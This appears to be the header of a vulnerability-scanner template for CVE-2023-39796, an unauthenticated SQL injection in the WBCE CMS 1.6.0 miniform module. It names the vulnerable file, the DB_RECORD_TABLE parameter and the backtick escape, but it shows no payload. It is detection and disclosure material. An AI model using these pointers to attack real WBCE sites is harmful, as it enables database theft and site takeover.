id: CVE-2023-39796

info:
  name: WBCE 1.6.0 - SQL Injection
  author: youngpope
  severity: critical
  description: |
    There is an sql injection vulnerability in "miniform module" which is a default module installed in the WBCE cms. It is an unauthenticated sqli so anyone could access it and takeover the whole database. In file "/modules/miniform/ajax_delete_message.php" there is no authentication check. On line 40 in this file, there is a DELETE query that is vulnerable, an attacker could jump from the query using the tick sign - `.
  impact: |
    Unauthenticated attackers can execute time-based SQL injection through the DB_RECORD_TABLE parameter in the miniform module to extract the complete CMS database and takeover the WBCE installation.
  remediation: Fixed in version 1.6.1
